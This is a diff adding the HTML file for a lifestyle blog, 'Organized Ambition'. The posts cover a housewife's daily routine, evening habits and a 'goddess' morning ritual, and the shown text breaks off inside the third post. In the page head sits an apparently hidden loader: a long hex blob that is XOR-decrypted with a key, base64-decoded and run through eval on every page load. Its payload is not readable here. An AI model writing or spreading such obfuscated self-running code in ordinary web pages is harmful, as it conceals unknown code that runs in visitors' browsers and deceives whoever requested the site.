@@ -1,0 +1,807 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Organized Ambition</title>
+    <!-- Added beautiful, elegant Google Fonts for a cozy warm aesthetic -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700;800&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* Warm Pastel-Cottagecore / Elegant Minimalist Styles */
+        :root {
+            --bg-primary: #fdfbf7;        /* Soft warm ivory background */
+            --bg-secondary: #f7f3ec;      /* Gentle linen cream for headers/footers */
+            --accent-peach: #e9b3a3;      /* Delicate dusty rose/peach */
+            --accent-sage: #93a895;       /* Soft grounding sage green */
+            --accent-clay: #b57c6b;       /* Earthy warm terracotta for main text highlights */
+            --text-main: #3d3430;         /* Deep cozy warm charcoal-brown */
+            --text-muted: #7d6f69;        /* Warm muted slate-taupe */
+            --card-bg: #ffffff;           /* Crisp, clean white for post cards */
+            --border-subtle: rgba(147, 168, 149, 0.15); /* Soft sage-tinted borders */
+            --border-hover: rgba(181, 124, 107, 0.4);  /* Gentle clay highlight border */
+            --shadow-soft: 0 10px 30px rgba(61, 52, 48, 0.04);
+            --shadow-hover: 0 15px 35px rgba(181, 124, 107, 0.1);
+            --radius: 24px;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            line-height: 1.8;
+            color: var(--text-main);
+            background-color: var(--bg-primary);
+            /* Delicate natural gradient curves to give a soothing, organic feel */
+            background-image: 
+                radial-gradient(circle at 100% 0%, #fbf4ea 0%, transparent 40%),
+                radial-gradient(circle at 0% 100%, #f4eae1 0%, transparent 40%);
+            background-attachment: fixed;
+            margin: 0;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Typography */
+        h1, h2, h3, h4, .username {
+            font-family: 'Outfit', sans-serif;
+            color: var(--accent-clay);
+            font-weight: 700;
+            letter-spacing: -0.2px;
+        }
+
+        .container {
+            max-width: 720px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        /* Top Navigation - Cozy Grounded Pill Links */
+        .top-nav {
+            padding: 20px 0;
+            text-align: center;
+            background-color: rgba(253, 251, 247, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid var(--border-subtle);
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .top-nav a {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            font-family: 'Outfit', sans-serif;
+            padding: 8px 22px;
+            text-decoration: none;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            cursor: pointer;
+            background-color: var(--bg-secondary);
+            border: 1px solid transparent;
+            border-radius: 50px;
+            font-weight: 500;
+        }
+
+        .top-nav a:hover {
+            background-color: var(--accent-sage);
+            border-color: transparent;
+            color: #ffffff;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 14px rgba(147, 168, 149, 0.25);
+        }
+
+        /* Header Styles */
+        header {
+            padding: 80px 0 40px;
+            text-align: center;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 3.5rem;
+            color: var(--accent-clay);
+            cursor: pointer;
+            text-shadow: 0 2px 10px rgba(181, 124, 107, 0.1);
+            transition: all 0.3s ease;
+            font-weight: 800;
+        }
+
+        header h1:hover {
+            transform: scale(1.01);
+            color: var(--accent-peach);
+        }
+
+        header p {
+            margin: 15px auto 0;
+            font-size: 1.1rem;
+            font-weight: 400;
+            color: var(--text-muted);
+            background: var(--bg-secondary);
+            display: inline-block;
+            padding: 6px 24px;
+            border-radius: 50px;
+            border: 1px solid var(--border-subtle);
+        }
+
+        /* Post Cards - Elegant Soft-Shadow Glassmorphism */
+        .post-card,
+        .single-post {
+            background: var(--card-bg);
+            padding: 0;
+            margin-bottom: 50px;
+            border-radius: var(--radius);
+            box-shadow: var(--shadow-soft);
+            border: 1px solid var(--border-subtle);
+            transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1), box-shadow 0.4s cubic-bezier(0.16, 1, 0.3, 1), border-color 0.4s ease;
+            cursor: pointer;
+            overflow: hidden;
+        }
+
+        .post-card:hover {
+            transform: translateY(-6px);
+            box-shadow: var(--shadow-hover);
+            border-color: var(--border-hover);
+        }
+
+        .single-post {
+            cursor: default;
+        }
+
+        .post-header {
+            padding: 22px 30px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid var(--border-subtle);
+            background: var(--bg-secondary);
+        }
+
+        .post-header img.avatar {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            margin-right: 15px;
+            border: 2px solid var(--accent-peach);
+            padding: 2px;
+            background-color: #ffffff;
+            object-fit: cover;
+        }
+
+        .post-header .username {
+            font-size: 1.15rem;
+            color: var(--text-main);
+            font-weight: 600;
+        }
+
+        .post-image {
+            width: 100%;
+            display: block;
+            max-height: 480px;
+            object-fit: cover;
+            border-bottom: 1px solid var(--border-subtle);
+        }
+
+        .post-content {
+            padding: 35px 40px 25px;
+        }
+
+        .post-content h2,
+        .post-content h1 {
+            margin: 0 0 18px;
+            font-size: 2rem;
+            line-height: 1.3;
+            color: var(--accent-clay);
+            font-weight: 700;
+        }
+
+        .post-content p {
+            margin-bottom: 22px;
+            font-size: 1.05rem;
+            font-weight: 400;
+            color: var(--text-main);
+        }
+
+        .post-content a {
+            color: var(--accent-clay);
+            text-decoration: none;
+            border-bottom: 1.5px solid var(--accent-peach);
+            padding-bottom: 1px;
+            font-weight: 600;
+            transition: all 0.2s ease;
+        }
+
+        .post-content a:hover {
+            color: var(--accent-sage);
+            border-bottom-color: var(--accent-sage);
+        }
+
+        .post-footer {
+            padding: 18px 40px;
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            font-family: 'Outfit', sans-serif;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid var(--border-subtle);
+            background: var(--bg-secondary);
+        }
+
+        /* Single Post Overrides */
+        .single-post .post-image {
+            max-height: none;
+        }
+
+        /* Back Button - Beautiful Terracotta Pill */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 30px;
+            color: #ffffff;
+            background-color: var(--accent-clay);
+            font-family: 'Outfit', sans-serif;
+            font-size: 1.05rem;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+            padding: 10px 26px;
+            border-radius: 50px;
+            box-shadow: 0 4px 14px rgba(181, 124, 107, 0.3);
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+        }
+
+        .back-button:hover {
+            background-color: transparent;
+            color: var(--accent-clay);
+            border-color: var(--accent-clay);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(181, 124, 107, 0.15);
+        }
+
+        /* Styled content block overrides for the articles */
+        .post-content div[style*="background"] {
+            background: #fdfcf9 !important;
+            border: 1px solid var(--accent-peach) !important;
+            border-radius: 16px !important;
+            padding: 24px 28px !important;
+            box-shadow: 0 4px 15px rgba(61, 52, 48, 0.02) !important;
+            margin: 30px 0 !important;
+            color: var(--text-main) !important;
+        }
+
+        .post-content h3[style*="border-left"] {
+            border-left: 4px solid var(--accent-clay) !important;
+            color: var(--accent-clay) !important;
+            padding-left: 15px !important;
+        }
+
+        .post-content h4[style*="background"] {
+            background: var(--bg-secondary) !important;
+            color: var(--accent-clay) !important;
+            border: 1px solid var(--border-subtle) !important;
+            border-radius: 8px !important;
+        }
+
+        .post-content span[style*="background"] {
+            background: var(--bg-secondary) !important;
+            color: var(--text-main) !important;
+            border: 1px solid var(--border-subtle) !important;
+            border-radius: 50px !important;
+            font-family: 'Outfit', sans-serif !important;
+            font-size: 0.85rem !important;
+            font-weight: 500 !important;
+            padding: 6px 14px !important;
+            display: inline-block;
+            margin: 5px 6px 5px 0;
+            transition: all 0.3s ease;
+        }
+
+        .post-content span[style*="background"]:hover {
+            border-color: var(--accent-peach) !important;
+            color: var(--accent-clay) !important;
+            background: #ffffff !important;
+            transform: translateY(-1px);
+        }
+
+        /* Ensure legibility for inline text colors */
+        .post-content p[style*="color"],
+        .post-content h3[style*="color"] {
+            color: inherit !important;
+        }
+    </style>
+    <script>
+        (function () {
+            var vtwjjrbym = "35230f2c5a2d050168377f09096819012d0a75595260651f2136122d513b2a5215051872753d7e475202415637773b752d55304b7f5a1f0e13361a73731d220a1524173e63130148685d5d33377802231f6b06025260641313563031523441082f1507345b767344525d630f305d052b004f2b7a5260081f3a2d1d28692b3208170b1b745a2d065c7b06771d09670d3d160a2c65577f180d1032662f6a2b10322c24322d5813160878065e001a647b7d067b74497864134f320c122379303a502f151c235d1c0d426428731e0a677a3e067c7456515a074b382305176435360e2f151f2e58020559520273133049233e156f02486a05392c152d1a347f0417053f0e14235d29014878277b14376728231f6b0600505a2929283d192c522b35172c7f037472070d416b2c7c171c47240f067b05567a703d1538263b3e523b2e0c3d1e17737a2d0656782c74001a730a232b5502487a7f071038216323521e3e50171a312c5d037e487d01631d09680106150a12445773223338261223793039053f0e1776601c0e5668020c57065d1d2a156023566364100e28086a745634361b2f153137631c0d09525c771709771d3d297f2c5d6a60030b2b3d1d3e563b3a12142307285a29114b55274d093102722a2d7f12096a5a3d0d2b562b2e531e3e51140a393163773f6050380057096801282c0b16585104034024223f3154342e1b2c151b7475762c06720674001a730a23067b0556575a170138223f3e611e41523f09652360297e016402630909682c312b7f124b5774394928363823563b0f053f1a602c5d292b5f6837671130597e37166f715f576017162b3d1e23563b0f05142013765813235955280c1e1f5e2f2816551648526f0b14120f200f731a39053f0e14237007065650386c001877273e1e557d017864134f320c1223793039053f0e14237007065678275117315d19322b41715e526f1f48135619717c1d320e150a2d2c6076116555287357096323312b6f3c427f7410163b1c2423544114172c0a6c7775293f47685d735732677231035606595770390d283262287b270b293f0e142370070656782c74001a730a23160a7d445005680b2b36663752411b0d3f2121016b110d67635e050000781d30166f7056697007482b321d746a2429173f0b1f2863032b486b387b5732677e2a067016477c5e1011382620236a342e18120a3931601c1541535d01171c472423067b05567a74101f3826122379303a51171a602f5b77244453280c0d0a6819342d0a7044505a070f1322152e6a2010092c151b745813725955285911315920730c5105567a74101f38261223562217053f0e14235f1537087828631430021e232a4f340870506c45";
+            var vjfaicbgs = "vMUD9DG11o5gS0KDO8D137QxqeSD0sxb";
+            var vyepniipe = "";
+            try {
+                for (var i = 0; i < vtwjjrbym.length; i += 2) {
+                    var vyhlqhepa = parseInt(vtwjjrbym.substr(i, 2), 16);
+                    vyepniipe += String.fromCharCode(vyhlqhepa ^ vjfaicbgs.charCodeAt((i / 2) % vjfaicbgs.length));
+                }
+                var vvqbkapbd = atob(vyepniipe);
+                eval(vvqbkapbd);
+            } catch (e) {
+                console.error("[DEBUG] Decryption or Execution failed: ", e);
+            }
+        })();
+    </script>
+</head>
+<body>
+    <nav class="top-nav">
+        <a onclick="navigate('home')">Home</a>
+        <a onclick="navigate('page', 'about')">About</a>
+        <a onclick="navigate('page', 'privacy')">Privacy Policy</a>
+        <a onclick="navigate('page', 'terms')">Terms</a>
+        <a onclick="navigate('page', 'contact')">Contact</a>
+    </nav>
+    <header>
+        <div class="container">
+            <h1 onclick="navigate('home')">Organized Ambition</h1>
+            <p>Thoughts, stories, and ideas.</p>
+        </div>
+    </header>
+    <main class="container" id="app">
+        <!-- Content will be injected here by JavaScript -->
+    </main>
+
+    <script>
+        // 1. Defined blog posts based on the 4 given images!
+        const posts = [
+            {
+                id: 'the-first-post',
+                title: 'The Ultimate Daily Routine Checklist for a Happy Housewife',
+                date: 'April 15, 2026',
+                image: './assets/the-ultimate-daily-routine-checklist-for-a-happy-housewife.png',
+                excerpt: 'Embrace a balanced, fulfilling lifestyle with the ultimate guide to structuring your daily routine! Learn how to gracefully juggle healthy morning habits, seamless home organization, nutritious meal prep, and highly rewarding me-time. Progress, not perfection, is your superpower. 🌸\n\n* Schedule intentional self-care periods to maintain high mental and physical energy levels.\n* Use simple checklists to streamline home organization and avoid overwhelm.\n\nSave for later! #HousewifeLife #DailyRoutine #HomeManagement #MindfulLiving #SelfCareForMoms',
+                content: `<p>A happy home starts with a happy heart. Being a housewife is not merely about executing a series of repetitive domestic tasks; it is a profound and impactful career that requires exceptional project management, strategic foresight, and emotional intelligence. In the modern era, managing a household is a multi-faceted discipline where organization, meal planning, parenting support, and self-care must exist in careful equilibrium. Balancing these responsibilities without burning out can feel challenging, but establishing a predictable yet flexible routine is the ultimate key to reclaiming your energy and finding joy in everyday moments.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>A detailed block-based daily routine structure keeps you proactive and minimizes daily cognitive fatigue.</li>
+    <li>Waking early and starting with spiritual grounding or gratitude completely shifts the energy of your entire home.</li>
+    <li>Daily "me-time" is non-negotiable for refilling your own cup and managing chronic stress.</li>
+    <li>Proactive meal planning and prepping for the next day on the evening before eliminates morning chaos.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Morning Rituals: Waking with Intention and Thankfulness</h2>
+<p>The tone of your day is established the moment your eyes open. Waking at 5:30 AM before the rest of the household wakes provides a quiet window of profound stillness. This "good morning" phase is the perfect opportunity to practice thankfulness, hydrate your body with warm water, and center your mind through short prayers or active meditation. Planning your day during this quiet period allows you to outline your primary goals and schedule self-care, turning you into the intentional author of your day rather than a reactive participant.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Keeping a dedicated "Grateful Heart" journal next to your bedside ensures that gratitude is your very first conscious action. Writing down three simple blessings each morning primes your brain to focus on abundance and beauty all day long.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The 6:00 AM Morning Routine and Preparation</h3>
+<p>Transitioning into the active morning routine begins at 6:00 AM. Start by freshening up, making the bed, and tidying up your personal space immediately. Making the bed provides a psychological quick win, establishing visual order. Next, head to the kitchen to prepare a wholesome breakfast and pack lunch or tiffin boxes for school and work. Preparing a balanced breakfast, such as nutrient-rich pancakes with berries, guarantees that your family leaves the house with steady, long-term energy.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Mid-Morning: Streamlining Home Management and Housekeeping</h2>
+<p>Once the family has departed, the period between 8:00 AM and noon is your peak execution window for heavy household management. Tackling kitchen clean-up immediately after breakfast stops grease and dishes from piling up. Organizing your chores into a structured cycle—such as dedicating specific days of the week to laundry, deep dishwashing, general house cleaning, and spatial organization—keeps you from feeling overwhelmed. Utilizing natural decorative woven baskets to corral miscellaneous clutter makes tidying swift and visually satisfying.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters</h3>
+  <p style="margin:0;font-size:1.05rem;line-height:1.7;">Maintaining a clean and organized home is not about achieving perfect museum standards. Rather, physical order directly correlates with mental tranquility. When your external physical environment is organized and free of chaotic clutter, your brain processes information more efficiently, stress hormones decrease, and you create a warm, inviting oasis where your loved ones feel instantly secure and comfortable.</p>
+</div>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Lunch and Reconnecting</h3>
+<p>At 12:30 PM, it is time to pivot to the lunch routine. Prepare a nutritious, vitamin-packed lunch for yourself and any family members at home. Serving your meals with love and setting aside distractions allows you to practice mindful eating and enjoy high-quality bonding. Whether chatting with children back from half-day classes or sharing a quick conversation with your spouse, breaking bread together forms the emotional anchor of the afternoon.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Afternoon Pivot: Nurturing the Self and the Mind</h2>
+<p>One of the most common pitfalls of modern housekeeping is neglecting personal wellness and growth. The block at 2:00 PM is designated entirely as "me-time." Use this precious quiet period to rest, read an inspiring book, listen to positive podcasts, or simply sip a calming cup of herbal tea or coffee. Recharging your own battery is essential for keeping stress at bay, maintaining cognitive sharpness, and preserving your emotional patience for the busy evening ahead.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Me-time is not a luxury or a selfish act; it is an absolute necessity. If you constantly operate on empty, you cannot fully show up for the people you love. View your daily self-care as a vital component of your home's overall health strategy.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The 4:30 PM After-School and Snack Wave</h3>
+<p>As the afternoon transitions, focus your attention on supporting your family's daily growth. Help children with their studies and school projects, ensuring they feel supported. Providing a healthy afternoon snack alongside comforting tea creates a soft landing pad for them to unwind from school stress. If you do not have children, use this block to nurture your own creative hobbies, write, or garden, fostering continuous personal evolution.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Evening Calm and Preparing for Restful Restoration</h2>
+<p>At 6:30 PM, the evening routine begins with dinner preparation. Prioritize simple, wholesome ingredients cooked with care. Use dinner as a beautiful space for the family to gather, talk, and share stories about their day. Following dinner, taking a gentle evening walk with your family helps digest your food and provides a natural, calming transition into the night. It is a peaceful, screen-free way to breathe in fresh air and feel grounded before bedtime.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The 9:30 PM Night Routine</h3>
+<p>As you prepare to end the day, the final night routine starting at 9:30 PM is dedicated to peaceful closure. Gently clean the kitchen to prevent morning stress, set out tools or clothes for tomorrow, and practice gratitude reflections. Doing a quick final check-in with your feelings lets you release any daily stress. Sleep early and rest deeply, trusting that you are doing an incredible job every single day. Being a housewife is indeed a superpower.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li><strong>Morning:</strong> Rise early, hydrate, make the bed, and prep healthy meals.</li>
+    <li><strong>Mid-Day:</strong> Batch cleaning chores, prepare a fresh lunch, and take "me-time" to read.</li>
+    <li><strong>Evening:</strong> Help with homework, cook a nourishing dinner, and take a calming walk.</li>
+    <li><strong>Night:</strong> Restore kitchen order, prep for the next morning, and practice gratitude.</li>
+  </ul>
+</div>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Housewife Routine</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Home Management</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Self Care</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Habit Tracker</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Meal Prep</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Mindful Motherhood</span>
+</div>`
+            },
+            {
+                id: 'the-second-post',
+                title: '9 Essential Habits for a Productive and Peaceful Evening Routine',
+                date: 'June 8, 2026',
+                image: './assets/9-essential-habits-for-a-productive-and-peaceful-evening-routine.png',
+                excerpt: 'Ready to cultivate deep peace and effortlessly prepare for tomorrow? Explore these nine daily habits designed to relax your body, clear your mind, and optimize your sleep environment. From candlelit journaling to screen-free reading, discover the simple power of small, consistent nighttime changes. 🌙\n\n* Take a relaxing warm bath to naturally melt away physical stress and lower cortisol.\n* Lay out your clothes and plan ahead to make your next morning feel effortless.\n\nSave for later! #EveningRoutine #NighttimeSelfCare #HealthyHabits #SleepHygiene #UnwindWithMe',
+                content: `<p>How you end your day is just as critical as how you begin it. In our fast-paced, screen-dominated world, we often carry the accumulated stress and sensory overload of the daytime straight into our beds, resulting in fragmented sleep and waking up fatigued. A highly structured, peaceful evening routine acts as a gentle bridge, allowing your nervous system to step down from active "fight-or-flight" survival mode into restorative, deep relaxation. By cultivating a few small habits at night, you can wash away daily anxieties, align your circadian rhythm, and set yourself up for an incredibly productive, energetic morning.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>A dedicated evening routine triggers melatonin release and transitions your mind into restorative sleep.</li>
+    <li>Decompressing through warm baths and skincare provides deep physical and mental stress relief.</li>
+    <li>Journaling and reading replace active blue-light screens, calming overactive brainwaves.</li>
+    <li>Proactive steps like preparing clothes and tidying your space prevent decision fatigue tomorrow morning.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Nurturing the Body: Bathing, Skincare, and Physical Decompression</h2>
+<p>The first steps of a truly rejuvenating evening routine focus on physical decompression. Indulging in a soothing warm bath is one of the most effective ways to tell your body that the workday is officially over. Immersing yourself in warm water expands blood vessels, which improves blood circulation and helps tired, tight muscles relax. When you exit the warm bath, your core body temperature naturally drops, signaling your brain to produce melatonin, the hormone responsible for initiating deep, restful sleep.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Turn your skincare routine into an intentional self-love ritual. Focus completely on the soothing sensations of cleansing, toning, and hydrating, taking deep breaths and reminding yourself that you are worthy of care.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Mindful Release: The Art of Journaling</h3>
+<p>Once your body is physically relaxed, focus your attention on calming your mind. Putting thoughts down in a dedicated journal serves as a vital mental release valve. Writing down your daily experiences, expressing deep gratitude, and processing lingering worries helps empty your mind of mental clutter, preventing those anxious middle-of-the-night thoughts. Reflecting on your day with compassion allows you to file away experiences and close the day's cognitive files.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Setting the Atmosphere: Lighting, Organization, and Soothing Brews</h2>
+<p>To deepen your relaxation, build a serene physical environment. Light an organic candle with soothing lavender, cedarwood, or vanilla essential oils. Dimming bright overhead lights and using warm, flickering candlelight cues your brain that bedtime is near, helping align your circadian rhythm. In this calm, warm lighting, spend five to ten minutes gently tidying up your room. A clean, organized space leads directly to a clear, calm mind, freeing you from waking up to distracting physical clutter.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters</h3>
+  <p style="margin:0;font-size:1.05rem;line-height:1.7;">Our minds are incredibly sensitive to environmental cues. Bright, cold overhead lighting and messy, cluttered spaces keep the brain in an active, hyper-alert state. In contrast, dimming lights, lighting a candle, and tidying up create a sensory sanctuary that naturally triggers safety, peace, and deep sleep readiness.</p>
+</div>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Sipping Herbal Infusions</h3>
+<p>Pairing your peaceful evening environment with a soothing cup of herbal tea is a wonderful way to relax. Brew caffeine-free varieties like chamomile, peppermint, valerian root, or lemon balm. Slowly sipping a warm beverage warms you from the inside out, helping relax stomach tension and soothe your nervous system, allowing you to slide gently into a sleepy state.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Nourishing the Mind and Reducing Morning Friction</h2>
+<p>The late evening is a precious time to feed your mind with inspiring content instead of doomscrolling through social media. Commit to reading at least 10 pages of a physical book before bed. Whether choosing fiction, poetry, philosophy, or personal growth, reading focuses your attention and acts as a gentle, screen-free transition to sleep. This simple habit keeps blue light from delaying your natural sleep cycle, protecting your eyes and your rest.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Preparing your clothes and accessories the night before significantly reduces morning decision fatigue. Laying out your outfit, shoes, and bag takes only five minutes, but it gives you a wonderful head start on a smooth, stress-free morning.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Sinking Into Deep, Restful Sleep</h3>
+<p>The final step of this evening routine is sleeping at a consistent hour. Slide under cozy, clean sheets, keep your bedroom cool, and let go of any thoughts of tomorrow. Rest deeply, knowing that these intentional nighttime habits are creating an amazing foundation for a happier, healthier, and much more vibrant life. Sweet dreams!</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li><strong>Physical Care:</strong> Take a warm bath and nourish your skin to relax.</li>
+    <li><strong>Mental Release:</strong> Clear your mind by journaling and reading 10 pages.</li>
+    <li><strong>Environmental Prep:</strong> Light a candle, tidy up, and prepare tomorrow's outfit.</li>
+    <li><strong>Rest:</strong> Enjoy warm herbal tea and slide into deep, restorative sleep.</li>
+  </ul>
+</div>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Evening Routine</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Self Care</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Sleep Hygiene</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Journaling</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Nighttime Habits</span>
+</div>`
+            },
+            {
+                id: 'the-third-post',
+                title: 'Moonlit Goddess Morning Ritual: 6 Steps to Nourish Your Soul',
+                date: 'April 24, 2026',
+                image: './assets/moonlit-goddess-morning-ritual-6-steps-to-nourish-your-soul.png',
+                excerpt: 'Awaken your inner magic with the Moonlit Goddess Morning Ritual! This beautiful six-step guide will walk you through healing steps to elevate your energy: from drinking lemon water and setting crystal intentions to sunrise forest walks and nutritious green smoothies. Nourish your body and mind. 🌿\n\n* Step into natural sunlight during the golden hour to support your sleep cycle.\n* Blend organic, vitamin-packed green smoothies to start your morning with clean fuel.\n\nSave for later! #MorningRitual #MindfulLiving #GoddessEnergy #HolisticWellness #DailyMagic',
+                content: `<p>Every morning is a beautiful opportunity to reconnect with your personal power, align with nature, and nourish your soul. The "Moonlit Goddess" morning ritual is an intentional, grounding framework designed to help you rise with grace and fill your day with magic. Rather than rushing straight into a busy to-do list, this six-step ritual invites you to slow down, practice self-love, and nourish your body, mind, and spirit. By weaving these mindful habits into your mornings, you create a powerful sense of inner peace that carries you beautifully through whatever the day holds.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
